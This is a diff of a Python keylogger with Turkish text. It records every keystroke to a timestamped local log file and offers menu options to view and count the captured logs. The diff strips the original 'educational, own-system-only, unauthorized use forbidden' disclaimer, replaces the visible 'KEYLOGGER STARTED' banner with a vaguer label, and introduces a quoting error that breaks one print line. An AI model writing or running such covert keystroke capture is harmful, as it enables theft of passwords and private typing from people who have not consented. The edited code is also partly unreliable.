@@ -1,9 +1,4 @@
 #!/usr/bin/env python3
-"""
-KEYLOGGER - EĞİTİM AMAÇLI
-Sadece kendi sisteminizde test etmek içindir.
-Yetkisiz kullanım YASAKTIR!
-"""
 
 import keyboard
 import datetime
@@ -32,18 +27,13 @@ class SafeKeylogger:
             f.write(text + '\n')
     
     def tus_basildi(self, key):
-        """Tuş basıldığında çalışır"""
         try:
             if hasattr(key, 'char') and key.char is not None:
-                # Normal karakter
                 tus = key.char
                 self.buffer.append(tus)
-                
-                # Ekrana yazdırma (opsiyonel)
                 print(tus, end='', flush=True)
                 
             else:
-                # Özel tuşlar
                 ozel_tuslar = {
                     'Key.space': ' ',
                     'Key.enter': '\n[ENTER]\n',
@@ -69,118 +59,95 @@ class SafeKeylogger:
                     tus = f'[{tus_adi.replace("Key.", "")}]'
                 
                 self.buffer.append(tus)
-                
-                # Enter tuşu için özel işlem
                 if tus == '\n[ENTER]\n':
-                    satir = ''.join(self.buffer[:-1])  # Enter'dan öncekiler
+                    satir = ''.join(self.buffer[:-1])
                     self.yaz_log(f"[{datetime.datetime.now()}] {satir}")
-                    self.buffer = []  # Buffer'ı temizle
-                
+                    self.buffer = []
                 print(tus, end='', flush=True)
-                
         except Exception as e:
             print(f"\n[!] Hata: {e}")
     
     def tus_birakildi(self, key):
-        """Tuş bırakıldığında çalışır (opsiyonel)"""
         pass
     
     def baslat(self):
         """Keylogger'ı başlat"""
         print("\n" + "="*50)
-        print("KEYLOGGER BAŞLATILDI - EĞİTİM AMAÇLI")
-        print("Çıkmak için 'ESC' tuşuna 3 kez basın")
+        print("çıkış için lütfen 3 kere "esc" butona basın")
         print("="*50 + "\n")
         
-        # Listener başlat
         with pynput_keyboard.Listener(
             on_press=self.tus_basildi,
             on_release=self.tus_birakildi
         ) as listener:
-            
-            # ESC ile çıkış kontrolü
             esc_count = 0
             while self.running:
                 if keyboard.is_pressed('esc'):
                     esc_count += 1
                     if esc_count >= 3:
-                        print("\n\n[!] Çıkış yapılıyor...")
+                        print("\n\n[!] çıkış yapılıyor")
                         self.running = False
                         self.yaz_log(f"\n{'='*50}")
-                        self.yaz_log(f"KEYLOGGER DURDURULDU: {datetime.datetime.now()}")
+                        self.yaz_log(f"durdu: {datetime.datetime.now()}")
                         self.yaz_log(f"{'='*50}\n")
                         break
                     time.sleep(0.5)
                 else:
                     esc_count = 0
                 time.sleep(0.1)
-            
             listener.stop()
-        
-        print(f"\n✅ Log dosyası: {self.log_file}")
-
+        print(f"\n log dosya: {self.log_file}")
 class KeyloggerAnaliz:
-    """Keylogger loglarını analiz etmek için"""
-    
     @staticmethod
     def log_oku(dosya_yolu):
-        """Log dosyasını oku"""
         if not os.path.exists(dosya_yolu):
-            print("Log dosyası bulunamadı!")
+            print("log dosya bulamadım !")
             return None
-        
         with open(dosya_yolu, 'r', encoding='utf-8') as f:
             return f.read()
-    
     @staticmethod
     def istatistik_goster(dosya_yolu):
-        """Log istatistiklerini göster"""
         log = KeyloggerAnaliz.log_oku(dosya_yolu)
         if log:
             print("\n" + "="*50)
-            print("LOG İSTATİSTİKLERİ")
+            print("logger sistem")
             print("="*50)
-            print(f"Toplam karakter: {len(log)}")
-            print(f"Satır sayısı: {log.count(chr(10))}")
-            print(f"Zaman damgaları: {log.count('[')}")
-
+            print(f"toplam karakter: {len(log)}")
+            print(f"satır sayı: {log.count(chr(10))}")
+            print(f"saat: {log.count('[')}")
 def main():
-    """Ana fonksiyon"""
     print("""
       keylogger sistem aktif
     """)
-    
     print("Seçenekler:")
-    print("1. Keylogger'ı başlat")
-    print("2. Logları görüntüle")
-    print("3. İstatistikleri göster")
+    print("1. logger başlat")
+    print("2. logger görüntüle")
+    print("3. istatistik göörüntüle")
     print("4. Çıkış")
     
-    secim = input("\nSeçiminiz (1-4): ")
+    secim = input("\n seçiniz lütfen (1-4): ")
     
     if secim == "1":
         keylogger = SafeKeylogger()
         try:
             keylogger.baslat()
         except KeyboardInterrupt:
-            print("\n\n[!] Manuel durduruldu.")
+            print("\n\n[!] ele durduldu.")
     
     elif secim == "2":
         log = KeyloggerAnaliz.log_oku("logs/tus_kayitlari.txt")
         if log:
             print("\n" + "="*50)
-            print("LOG İÇERİĞİ")
+            print("içerik")
             print("="*50)
             print(log)
-    
     elif secim == "3":
         KeyloggerAnaliz.istatistik_goster("logs/tus_kayitlari.txt")
     
     elif secim == "4":
-        print("Çıkış yapılıyor...")
+        print("Çıkış yaptım")
     
     else:
-        print("Geçersiz seçim!")
-
+        print("yanlış seçim!")
 if __name__ == "__main__":
     main()
